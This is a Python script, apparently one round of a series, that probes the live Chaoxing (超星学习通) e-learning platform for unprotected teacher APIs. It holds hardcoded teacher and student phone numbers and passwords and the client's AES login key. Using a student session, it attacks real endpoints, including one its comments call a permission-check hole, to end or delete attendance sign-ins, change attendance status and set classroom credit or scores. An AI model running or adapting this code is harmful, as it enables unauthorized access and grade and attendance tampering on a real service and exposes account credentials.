#!/usr/bin/env python3
"""
超星学习通 - 第6轮探索: 精准定位积分和删除API
策略转变:
1. 从i.chaoxing.com/base页面提取真实的API端点
2. 通过正确的课程页面URL访问教师管理界面
3. 尝试通过mobilelearn的已知API模式推导新端点
4. 尝试通过FxxkStar项目发现的API模式
"""

import requests
import json
import re
import time
import urllib3
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TEACHER_PHONE = "19712720708"
TEACHER_PWD = "3.1415926Cpy"
STUDENT_PHONE = "18436633997"
STUDENT_PWD = "3.1415926Cpy"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"

AES_KEY = "u2oh6Vu^HWe4_AES"
AES_IV = AES_KEY

def aes_enc(text):
    key = AES_KEY.encode()
    iv = AES_IV.encode()
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded = pad(text.encode(), 16)
    encrypted = cipher.encrypt(padded)
    return base64.b64encode(encrypted).decode()

def get_mobile_ua():
    return ("Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 "
            "ChaoXingStudy/ChaoXingStudy_3_6.1_android_phone_202204251840_27")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={
        "fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
        "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
        "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
        "independentId": "0", "independentNameId": "0"
    }, allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def web_login(phone, pwd):
    s = requests.Session()
    s.verify = False
    web_ua = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
              "Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0")
    s.headers.update({"User-Agent": web_ua})
    s.post(LOGIN_URL, data={
        "fid": "-1", "uname": phone, "password": pwd,
        "refer": "http://i.mooc.chaoxing.com", "t": "true",
        "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0"
    }, headers={"X-Requested-With": "XMLHttpRequest"},
        allow_redirects=False, timeout=30)
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    return s

def main():
    results = {}
    print("=" * 80)
    print("超星学习通 - 第6轮探索: 精准定位积分和删除API")
    print("=" * 80)

    # === 登录 ===
    print("\n[*] 登录...")
    t_session, t_puid = login(TEACHER_PHONE, TEACHER_PWD)
    print(f"    教师PUID: {t_puid}")
    s_session, s_puid = login(STUDENT_PHONE, STUDENT_PWD)
    print(f"    学生PUID: {s_puid}")
    tw_session = web_login(TEACHER_PHONE, TEACHER_PWD)
    sw_session = web_login(STUDENT_PHONE, STUDENT_PWD)

    # =============================================
    # 第1部分: 从i.chaoxing.com/base提取API端点
    # =============================================
    print("\n" + "=" * 80)
    print("第1部分: 从i.chaoxing.com/base提取API端点")
    print("=" * 80)

    try:
        r = tw_session.get("https://i.chaoxing.com/base", timeout=30, verify=False)
        base_html = r.text
        print(f"  页面大小: {len(base_html)} bytes")

        # 提取所有JS文件URL
        js_urls = re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']', base_html)
        print(f"  发现JS文件: {len(js_urls)}")

        all_api_endpoints = set()

        # 提取页面内联脚本中的API端点
        inline_scripts = re.findall(r'<script[^>]*>(.*?)</script>', base_html, re.DOTALL)
        for script in inline_scripts:
            # 搜索API路径
            api_matches = re.findall(r'["\'](/[^"\']*(?:api|credit|point|score|sign|active|delete|end)[^"\']*)["\']', script)
            for m in api_matches:
                all_api_endpoints.add(m)
                print(f"    内联脚本API: {m}")

        # 获取关键JS文件
        for js_url in js_urls[:10]:  # 只检查前10个JS文件
            if not js_url.startswith("http"):
                if js_url.startswith("//"):
                    js_url = "https:" + js_url
                elif js_url.startswith("/"):
                    js_url = "https://i.chaoxing.com" + js_url

            try:
                js_resp = tw_session.get(js_url, timeout=10, verify=False)
                if js_resp.status_code == 200:
                    js_text = js_resp.text
                    # 搜索API路径模式
                    patterns = [
                        r'["\'](/mooc-ans/[^"\']+)["\']',
                        r'["\'](/ppt/[^"\']+)["\']',
                        r'["\'](/pptSign/[^"\']+)["\']',
                        r'["\'](/newsign/[^"\']+)["\']',
                        r'["\'](/mycourse/[^"\']+)["\']',
                        r'["\'](/classroomCredit[^"\']*)["\']',
                        r'["\'](/credit[^"\']*)["\']',
                        r'["\'](/point[^"\']*)["\']',
                        r'["\'](/score[^"\']*)["\']',
                        r'url\s*[:=]\s*["\']([^"\']*(?:credit|point|score|sign|active|delete|end)[^"\']*)["\']',
                    ]
                    for pattern in patterns:
                        matches = re.findall(pattern, js_text)
                        for m in matches:
                            if len(m) < 200 and not m.endswith('.js') and not m.endswith('.css') and not m.endswith('.png'):
                                all_api_endpoints.add(m)
                                print(f"    JS API: {m[:100]}")
            except:
                pass

        results["base_api_endpoints"] = list(all_api_endpoints)
        print(f"\n  共发现API端点: {len(all_api_endpoints)}")

    except Exception as e:
        print(f"  访问i.chaoxing.com/base失败: {e}")

    # =============================================
    # 第2部分: 通过课程门户页面提取API
    # =============================================
    print("\n" + "=" * 80)
    print("第2部分: 通过课程门户页面提取API")
    print("=" * 80)

    # 课程门户页面(之前返回200, len=22493)
    try:
        r = tw_session.get(f"https://mooc1.chaoxing.com/course/{COURSE_ID}.html", timeout=30, verify=False)
        course_html = r.text
        print(f"  课程门户页面大小: {len(course_html)} bytes")

        # 提取JS文件
        js_urls = re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']', course_html)
        print(f"  发现JS文件: {len(js_urls)}")

        # 提取页面中的API路径
        api_matches = re.findall(r'["\'](/[^"\']*(?:api|credit|point|score|sign|active|delete|end)[^"\']*)["\']', course_html)
        for m in api_matches:
            if len(m) < 200:
                all_api_endpoints.add(m)
                print(f"    课程页面API: {m}")

        # 获取课程页面JS文件
        for js_url in js_urls[:5]:
            if not js_url.startswith("http"):
                if js_url.startswith("//"):
                    js_url = "https:" + js_url
                elif js_url.startswith("/"):
                    js_url = "https://mooc1.chaoxing.com" + js_url

            try:
                js_resp = tw_session.get(js_url, timeout=10, verify=False)
                if js_resp.status_code == 200:
                    js_text = js_resp.text
                    patterns = [
                        r'["\'](/mooc-ans/[^"\']+)["\']',
                        r'["\'](/ppt/[^"\']+)["\']',
                        r'["\'](/pptSign/[^"\']+)["\']',
                        r'["\'](/newsign/[^"\']+)["\']',
                        r'["\'](/mycourse/[^"\']+)["\']',
                        r'url\s*[:=]\s*["\']([^"\']*(?:credit|point|score|sign|active|delete|end)[^"\']*)["\']',
                        r'ajax\(["\']([^"\']+)["\']',
                    ]
                    for pattern in patterns:
                        matches = re.findall(pattern, js_text)
                        for m in matches:
                            if len(m) < 200 and not m.endswith(('.js', '.css', '.png', '.jpg', '.gif')):
                                all_api_endpoints.add(m)
                                print(f"    课程JS API: {m[:100]}")
            except:
                pass

    except Exception as e:
        print(f"  访问课程门户页面失败: {e}")

    # =============================================
    # 第3部分: 尝试访问教师课堂管理页面
    # =============================================
    print("\n" + "=" * 80)
    print("第3部分: 尝试访问教师课堂管理页面")
    print("=" * 80)

    # 教师课堂管理可能需要的URL格式
    teacher_mgmt_urls = [
        # 课堂互动管理 - 这是教师发活动、管理积分的核心页面
        f"https://mooc1.chaoxing.com/mycourse/teacherstudy?courseId={COURSE_ID}&classId={CLASS_ID}&chapterId=0&cpi=0",
        f"https://mooc1.chaoxing.com/mycourse/teacherstudy?courseId={COURSE_ID}&classId={CLASS_ID}&nodeId=0",
        f"https://mooc1.chaoxing.com/teacherstudy?courseId={COURSE_ID}&classId={CLASS_ID}",
        # 课堂页面
        f"https://mooc1.chaoxing.com/classroom?courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://mooc1.chaoxing.com/mycourse/classroom?courseId={COURSE_ID}&classId={CLASS_ID}",
        # 积分管理
        f"https://mooc1.chaoxing.com/mycourse/scoremanage?courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://mooc1.chaoxing.com/scoremanage?courseId={COURSE_ID}&classId={CLASS_ID}",
        # 活动管理
        f"https://mooc1.chaoxing.com/mycourse/activemanage?courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://mooc1.chaoxing.com/activemanage?courseId={COURSE_ID}&classId={CLASS_ID}",
        # 签到管理
        f"https://mooc1.chaoxing.com/mycourse/signmanage?courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://mooc1.chaoxing.com/signmanage?courseId={COURSE_ID}&classId={CLASS_ID}",
        # 学生管理
        f"https://mooc1.chaoxing.com/mycourse/stumanage?courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://mooc1.chaoxing.com/mycourse/stuManage?courseId={COURSE_ID}&classId={CLASS_ID}",
        # 成绩管理
        f"https://mooc1.chaoxing.com/mycourse/grade?courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://mooc1.chaoxing.com/mycourse/score?courseId={COURSE_ID}&classId={CLASS_ID}",
    ]

    for url in teacher_mgmt_urls:
        try:
            r = tw_session.get(url, timeout=15, verify=False, allow_redirects=True)
            path = url.split("chaoxing.com")[1][:60]
            status_mark = "!!!" if r.status_code == 200 and len(r.text) > 1000 else "   "
            print(f"  {status_mark} [{r.status_code}] {path} (len={len(r.text)})")

            if r.status_code == 200 and len(r.text) > 1000:
                # 提取API端点
                api_matches = re.findall(r'["\'](/[^"\']*(?:api|credit|point|score|sign|active|delete|end)[^"\']*)["\']', r.text)
                for m in api_matches:
                    if len(m) < 200:
                        all_api_endpoints.add(m)
                        print(f"    发现API: {m}")

                # 提取JS文件
                js_urls = re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']', r.text)
                for js_url in js_urls[:3]:
                    if not js_url.startswith("http"):
                        if js_url.startswith("//"):
                            js_url = "https:" + js_url
                        elif js_url.startswith("/"):
                            js_url = "https://mooc1.chaoxing.com" + js_url
                    try:
                        js_resp = tw_session.get(js_url, timeout=10, verify=False)
                        if js_resp.status_code == 200:
                            js_text = js_resp.text
                            # 搜索credit/point/score/sign/active/delete/end相关API
                            for pattern in [r'url\s*[:=]\s*["\']([^"\']+)["\']', r'ajax\(["\']([^"\']+)["\']']:
                                matches = re.findall(pattern, js_text)
                                for m in matches:
                                    if any(kw in m.lower() for kw in ['credit', 'point', 'score', 'sign', 'active', 'delete', 'end', 'api']):
                                        if len(m) < 200 and not m.endswith(('.js', '.css', '.png')):
                                            all_api_endpoints.add(m)
                                            print(f"    JS API: {m[:100]}")
                    except:
                        pass
        except Exception as e:
            print(f"  [ERR] {url.split('chaoxing.com')[1][:60]}: {e}")

    # =============================================
    # 第4部分: 通过mooc1-api获取课程信息
    # =============================================
    print("\n" + "=" * 80)
    print("第4部分: 通过mooc1-api获取课程详细信息")
    print("=" * 80)

    # 获取课程详情 - 这可能包含积分和活动信息
    course_info_urls = [
        f"https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0",
        f"https://mooc1-api.chaoxing.com/mooc-ans/mycourse/getCourseInfo?courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://mooc1-api.chaoxing.com/mooc-ans/mycourse/courseinfo?courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://mooc1-api.chaoxing.com/mooc-ans/mycourse/stuInfo?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        f"https://mooc1-api.chaoxing.com/mooc-ans/mycourse/studentInfo?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        # 课程统计
        f"https://mooc1-api.chaoxing.com/mooc-ans/mycourse/stat?courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://mooc1-api.chaoxing.com/mooc-ans/mycourse/scoreStat?courseId={COURSE_ID}&classId={CLASS_ID}",
        # 课堂积分统计
        f"https://mooc1-api.chaoxing.com/mooc-ans/classroomCredit/stat?courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://mooc1-api.chaoxing.com/mooc-ans/classroomCredit/list?courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://mooc1-api.chaoxing.com/mooc-ans/classroomCredit/getStuCredit?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        # 课堂互动统计
        f"https://mooc1-api.chaoxing.com/mooc-ans/interaction/stat?courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://mooc1-api.chaoxing.com/mooc-ans/interaction/list?courseId={COURSE_ID}&classId={CLASS_ID}",
        # 签到统计
        f"https://mooc1-api.chaoxing.com/mooc-ans/sign/stat?courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://mooc1-api.chaoxing.com/mooc-ans/sign/list?courseId={COURSE_ID}&classId={CLASS_ID}",
    ]

    for url in course_info_urls:
        try:
            r = t_session.get(url, timeout=15, verify=False)
            path = url.split("chaoxing.com")[1][:70]
            status_mark = "!!!" if r.status_code == 200 and len(r.text) > 10 else "   "
            print(f"  {status_mark} [{r.status_code}] {path} (len={len(r.text)}) {r.text[:100]}")
        except Exception as e:
            print(f"  [ERR] {url.split('chaoxing.com')[1][:70]}: {e}")

    # =============================================
    # 第5部分: 测试从FxxkStar项目发现的API模式
    # =============================================
    print("\n" + "=" * 80)
    print("第5部分: 测试FxxkStar项目发现的API模式")
    print("=" * 80)

    # FxxkStar使用web端登录方式，访问课程页面
    # 关键发现: FxxkStar使用 /mycourse/studentstudy 页面
    # 课程页面URL格式: https://mooc1.chaoxing.com/mycourse/studentstudy?courseId=XXX&classId=XXX
    # 但这个页面需要正确的cookie和referer

    # 尝试通过FxxkStar的方式访问课程
    fxxkstar_urls = [
        # 课程学习页面
        f"https://mooc1.chaoxing.com/mycourse/studentstudy?courseId={COURSE_ID}&classId={CLASS_ID}",
        # 章节列表
        f"https://mooc1-api.chaoxing.com/mooc-ans/mycourse/chapterList?courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://mooc1-api.chaoxing.com/mooc-ans/mycourse/getChapterList?courseId={COURSE_ID}&classId={CLASS_ID}",
        # 活动列表(已知的)
        f"https://mobilelearn.chaoxing.com/ppt/activeAPI/taskactivelist?courseId={COURSE_ID}&classId={CLASS_ID}&uid={t_puid}",
    ]

    for url in fxxkstar_urls:
        try:
            r = tw_session.get(url, timeout=15, verify=False)
            path = url.split("chaoxing.com")[1][:70]
            status_mark = "!!!" if r.status_code == 200 and len(r.text) > 100 else "   "
            print(f"  {status_mark} [{r.status_code}] {path} (len={len(r.text)})")

            if r.status_code == 200 and len(r.text) > 1000:
                # 提取API
                api_matches = re.findall(r'["\'](/[^"\']*(?:api|credit|point|score|sign|active|delete|end)[^"\']*)["\']', r.text)
                for m in api_matches:
                    if len(m) < 200:
                        all_api_endpoints.add(m)
                        print(f"    发现API: {m}")
        except Exception as e:
            print(f"  [ERR] {url.split('chaoxing.com')[1][:70]}: {e}")

    # =============================================
    # 第6部分: 精准测试 - 基于已知API模式推导
    # =============================================
    print("\n" + "=" * 80)
    print("第6部分: 精准测试 - 基于已知API模式推导")
    print("=" * 80)

    # 已知有效的API:
    # 1. /ppt/activeAPI/taskactivelist - 获取活动列表
    # 2. /pptSign/stuSignajax - 学生签到
    # 3. /pptSign/endSign - 教师结束签到
    # 4. /pptSign/updateSignStatus - 旧路径修改签到状态(有权限校验)
    # 5. /newsign/updateSignStatus - 新路径修改签到状态(无权限校验 - 漏洞!)
    # 6. /pptSign/updateSignStatusByUidsV2 - 教师批量修改签到状态

    # 推导: 如果/newsign/路径缺少权限校验，那么可能还有:
    # - /newsign/updateSignStatusByUids (类似旧路径但无权限校验)
    # - /newsign/endSign (类似旧路径但可能无权限校验)
    # - /newsign/deleteSign
    # - /newsign/其他教师操作

    # 关键: 需要正确的参数格式
    # /newsign/updateSignStatus 的参数: activeId, uid, status, DB_STRATEGY=PRIMARY_KEY
    # /pptSign/endSign 的参数: activeId

    # 获取一个有效的签到活动ID
    try:
        r = t_session.get(f"https://mobilelearn.chaoxing.com/ppt/activeAPI/taskactivelist?courseId={COURSE_ID}&classId={CLASS_ID}&uid={t_puid}", timeout=20, verify=False)
        active_data = r.json()
        active_list = active_data.get("activeList", [])
        sign_aids = []
        for item in active_list:
            if item.get("activeType") == 2 or "sign" in str(item.get("url", "")).lower():
                sign_aids.append(item.get("id"))
                print(f"  签到活动: aid={item.get('id')}, name={item.get('nameOne', 'N/A')}, status={item.get('status')}")
    except:
        sign_aids = []

    test_aid = sign_aids[0] if sign_aids else "5000163776552"
    print(f"\n  使用测试活动ID: {test_aid}")

    # 精准测试 - 使用正确的参数格式
    precise_tests = [
        # /newsign/ 路径 - 删除/结束签到 (学生)
        {
            "url": f"https://mooc1-api.chaoxing.com/mooc-ans/newsign/endSign",
            "method": "POST",
            "data": {"activeId": str(test_aid)},
            "desc": "学生-newsign/endSign-POST(无DB_STRATEGY)"
        },
        {
            "url": f"https://mooc1-api.chaoxing.com/mooc-ans/newsign/endSign",
            "method": "GET",
            "params": f"activeId={test_aid}",
            "desc": "学生-newsign/endSign-GET(无DB_STRATEGY)"
        },
        {
            "url": f"https://mooc1-api.chaoxing.com/mooc-ans/newsign/deleteSign",
            "method": "POST",
            "data": {"activeId": str(test_aid)},
            "desc": "学生-newsign/deleteSign-POST(无DB_STRATEGY)"
        },
        {
            "url": f"https://mooc1-api.chaoxing.com/mooc-ans/newsign/deleteSign",
            "method": "GET",
            "params": f"activeId={test_aid}",
            "desc": "学生-newsign/deleteSign-GET(无DB_STRATEGY)"
        },
        # /newsign/updateSignStatusByUids - 批量修改(可能无权限校验)
        {
            "url": f"https://mooc1-api.chaoxing.com/mooc-ans/newsign/updateSignStatusByUids",
            "method": "POST",
            "data": {"activeId": str(test_aid), "uids": s_puid, "status": "1", "DB_STRATEGY": "PRIMARY_KEY"},
            "desc": "学生-newsign/updateSignStatusByUids-POST"
        },
        {
            "url": f"https://mooc1-api.chaoxing.com/mooc-ans/newsign/updateSignStatusByUidsV2",
            "method": "GET",
            "params": f"activeId={test_aid}&uids={s_puid}&status=1&DB_STRATEGY=PRIMARY_KEY",
            "desc": "学生-newsign/updateSignStatusByUidsV2-GET"
        },
        # /newsign/ 路径 - 积分相关
        {
            "url": f"https://mooc1-api.chaoxing.com/mooc-ans/newsign/classroomCredit",
            "method": "POST",
            "data": {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "DB_STRATEGY": "PRIMARY_KEY"},
            "desc": "学生-newsign/classroomCredit-POST"
        },
        {
            "url": f"https://mooc1-api.chaoxing.com/mooc-ans/newsign/updateCredit",
            "method": "POST",
            "data": {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "credit": "100", "DB_STRATEGY": "PRIMARY_KEY"},
            "desc": "学生-newsign/updateCredit-POST"
        },
        # /ppt/activeAPI/ - 积分相关(教师端)
        {
            "url": f"https://mobilelearn.chaoxing.com/ppt/activeAPI/classroomCredit",
            "method": "GET",
            "params": f"courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
            "desc": "学生-activeAPI/classroomCredit-GET"
        },
        {
            "url": f"https://mobilelearn.chaoxing.com/ppt/activeAPI/addScore",
            "method": "POST",
            "data": {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "score": "5", "activeId": str(test_aid)},
            "desc": "学生-activeAPI/addScore-POST"
        },
        # 教师端对比测试
        {
            "url": f"https://mooc1-api.chaoxing.com/mooc-ans/newsign/endSign",
            "method": "POST",
            "data": {"activeId": str(test_aid)},
            "desc": "教师-newsign/endSign-POST(无DB_STRATEGY)",
            "session": "teacher"
        },
        {
            "url": f"https://mooc1-api.chaoxing.com/mooc-ans/newsign/deleteSign",
            "method": "POST",
            "data": {"activeId": str(test_aid)},
            "desc": "教师-newsign/deleteSign-POST(无DB_STRATEGY)",
            "session": "teacher"
        },
        {
            "url": f"https://mooc1-api.chaoxing.com/mooc-ans/newsign/classroomCredit",
            "method": "POST",
            "data": {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "DB_STRATEGY": "PRIMARY_KEY"},
            "desc": "教师-newsign/classroomCredit-POST",
            "session": "teacher"
        },
    ]

    precise_results = []
    for test in precise_tests:
        session = t_session if test.get("session") == "teacher" else s_session
        try:
            if test["method"] == "GET":
                url = test["url"] + "?" + test.get("params", "")
                r = session.get(url, timeout=15, verify=False)
            else:
                r = session.post(test["url"], data=test.get("data", {}), timeout=15, verify=False)

            result = {"desc": test["desc"], "url": r.url, "status": r.status_code, "text": r.text[:300], "len": len(r.text)}
            precise_results.append(result)
            status_mark = "!!!" if r.status_code == 200 and len(r.text) > 10 else "   "
            print(f"  {status_mark} [{r.status_code}] {test['desc']} (len={len(r.text)}) {r.text[:120]}")
        except Exception as e:
            result = {"desc": test["desc"], "url": test.get("url", ""), "status": -1, "text": str(e)[:200], "len": 0}
            precise_results.append(result)
            print(f"  [ERR] {test['desc']}: {e}")

    results["precise_tests"] = precise_results

    # =============================================
    # 第7部分: 尝试通过mobilelearn的签到详情API
    # =============================================
    print("\n" + "=" * 80)
    print("第7部分: 签到详情API探索")
    print("=" * 80)

    sign_detail_apis = [
        # 签到详情 - 可能包含积分信息
        f"https://mobilelearn.chaoxing.com/pptSign/signDetail?activeId={test_aid}&courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        f"https://mobilelearn.chaoxing.com/pptSign/signDetail?activeId={test_aid}&uid={s_puid}",
        # 签到结果
        f"https://mobilelearn.chaoxing.com/pptSign/signResult?activeId={test_aid}&courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://mobilelearn.chaoxing.com/pptSign/signResult?activeId={test_aid}&uid={s_puid}",
        # 签到列表
        f"https://mobilelearn.chaoxing.com/pptSign/signList?activeId={test_aid}&courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://mobilelearn.chaoxing.com/pptSign/signList?activeId={test_aid}&uid={s_puid}",
        # 签到学生列表
        f"https://mobilelearn.chaoxing.com/pptSign/stuList?activeId={test_aid}&courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://mobilelearn.chaoxing.com/pptSign/studentList?activeId={test_aid}&courseId={COURSE_ID}&classId={CLASS_ID}",
        # 教师端签到管理
        f"https://mobilelearn.chaoxing.com/pptSign/teacherSign?activeId={test_aid}&courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://mobilelearn.chaoxing.com/pptSign/manageSign?activeId={test_aid}&courseId={COURSE_ID}&classId={CLASS_ID}",
    ]

    for url in sign_detail_apis:
        try:
            r = s_session.get(url, timeout=15, verify=False)
            path = url.split("chaoxing.com")[1][:70]
            status_mark = "!!!" if r.status_code == 200 and len(r.text) > 100 else "   "
            print(f"  {status_mark} [{r.status_code}] {path} (len={len(r.text)}) {r.text[:100]}")

            # 如果返回HTML页面，提取API端点
            if r.status_code == 200 and len(r.text) > 500 and '<html' in r.text.lower():
                api_matches = re.findall(r'["\'](/[^"\']*(?:api|credit|point|score|sign|active|delete|end)[^"\']*)["\']', r.text)
                for m in api_matches:
                    if len(m) < 200:
                        all_api_endpoints.add(m)
                        print(f"    发现API: {m}")
        except Exception as e:
            print(f"  [ERR] {url.split('chaoxing.com')[1][:70]}: {e}")

    # =============================================
    # 汇总
    # =============================================
    print("\n" + "=" * 80)
    print("汇总: 所有发现的API端点")
    print("=" * 80)

    # 过滤掉明显不是API的端点
    filtered_endpoints = set()
    for ep in all_api_endpoints:
        # 排除明显的非API路径
        if any(skip in ep.lower() for skip in ['.js', '.css', '.png', '.jpg', '.gif', '.svg', '.ico', '.woff', '.ttf', 'echarts', 'jquery', 'bootstrap']):
            continue
        if len(ep) > 150:
            continue
        filtered_endpoints.add(ep)

    print(f"\n[*] 过滤后的API端点: {len(filtered_endpoints)}")
    for ep in sorted(filtered_endpoints):
        print(f"  {ep}")

    results["all_api_endpoints"] = list(filtered_endpoints)

    # 保存结果
    with open("/workspace/credit_delete_round6_results.json", "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2, default=str)

    print(f"\n[*] 结果已保存到 /workspace/credit_delete_round6_results.json")

if __name__ == "__main__":
    main()
